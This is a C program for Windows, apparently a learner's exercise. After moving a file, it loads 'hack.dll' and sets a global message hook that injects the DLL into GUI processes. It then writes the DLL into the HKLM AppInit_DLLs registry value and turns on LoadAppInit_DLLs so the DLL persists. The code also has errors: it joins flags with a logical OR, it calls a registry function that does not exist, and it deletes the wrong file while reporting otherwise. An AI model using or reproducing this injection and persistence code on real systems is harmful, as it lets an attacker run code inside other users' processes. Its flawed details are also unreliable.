#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
        printf("Welcome to my project\n");
        // welcome message

       char* src = "C:\\Users\\Admin\\Placement\\Help\\test.txt";
       char* dst = "C:\\Users\\Admin\\Placement\\Day 5\\test.txt";
        // source and location i want to move the file to

        // move file Ex a powerful windows api method of moving files 
       if (MoveFileEx(src, dst, MOVEFILE_REPLACE_EXISTING || MOVEFILE_COPY_ALLOWED)) 
       // MoveFileEx is "strict." If you try to move a file from C: to D: without the MOVEFILE_COPY_ALLOWED flag the function will fail with Error 17 (ERROR_NOT_SAME_DEVICE).
       {
        printf("Success! File moved and overwritten if it existed.\n");
    } else {
        printf("Failed. Error code: %lu\n", GetLastError());
  if (remove(dst) == 0) { // delete file logic 
            printf("[+] Source file deleted successfully.\n");
        } else {
            printf("[!] Source already gone or couldn't be deleted.\n");
        }
    }

    printf("Start injector or quit 1 or 2\n");
    int userInput = 0;
    scanf("%d", &userInput);

    
    if (userInput == 1)
    {
        printf("loading injector..");
       
        HANDLE hFile;
        char* filepath = "C:\\Users\\Admin\\Placement\\Day 5\\hack.dll";

       // 2. Load the DLL into the injector's memory space
    HMODULE hDll = LoadLibraryA(filepath);
    if (hDll == NULL) {
        printf("[-] Could not find hack.dll at %s. Error: %lu\n", filepath, GetLastError());
        return 1;
    }

    // 3. Find the 'MyHook' function inside that DLL
    FARPROC hookFn = GetProcAddress(hDll, "MyHook");
    if (hookFn == NULL) {
        printf("[-] Could not find function inside DLL. Error: %lu\n", GetLastError());
        return 1;
    }

    // 4. SET THE HOOK: This is what triggers the "Injected" print/message
    // Using WH_GETMESSAGE (3) and thread ID '0' (Global)
    HHOOK hHook = SetWindowsHookExA(WH_GETMESSAGE, (HOOKPROC)hookFn, hDll, 0);

    if (hHook) {
        printf("[+] Global Hook set! Interact with any window to trigger the DLL.\n");
        printf("[+] Press Enter to stop and clean up.\n");
        getchar(); getchar(); // Wait for user
        UnhookWindowsHookEx(hHook);
    } else {
        printf("[-] Hooking failed. Error: %lu\n", GetLastError());
    }
    

    }
    else
    {
        printf("goodbye\n");
    }

    

    printf("Hi\n");
   HKEY hKey;
    // The registry path you stored
    const char* registryPath = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

    const char* dllPath = "C:\\Users\\Admin\\Placement\\Day 5\\hack.dll";
    DWORD loadAppInit = 1; // Enable the feature

    // 1. Open the Key
    // We use KEY_SET_VALUE to get permission to write
    LSTATUS status = RegOpenKeyExA(HKEY_LOCAL_MACHINE, registryPath, 0, KEY_SET_VALUE, &hKey);

    if (status != ERROR_SUCCESS) {
        if (status == ERROR_ACCESS_DENIED) {
            printf("[-] Access Denied. Please run as Administrator!\n");
        } else {
            printf("[-] Failed to open registry key. Error: %ld\n", status);
        }
        return 1;
    }

    // 2. Write the DLL Path to "AppInit_DLLs" (REG_SZ = String)
    status = RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1);
    if (status == ERROR_SUCCESS) {
        printf("[+] AppInit_DLLs set to: %s\n", dllPath);
    }

    // 3. Write the Activation flag to "LoadAppInit_DLLs" (REG_DWORD = Number)
    status = RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&loadAppInit, sizeof(DWORD));
    if (status == ERROR_SUCCESS) {
        printf("[+] LoadAppInit_DLLs enabled (set to 1).\n");
    }

    // 4. Close the handle
    RegCloseHandle(hKey);

    printf("[!] Registry modification complete. Changes may require a restart or new process launch.\n");
    return 0;
}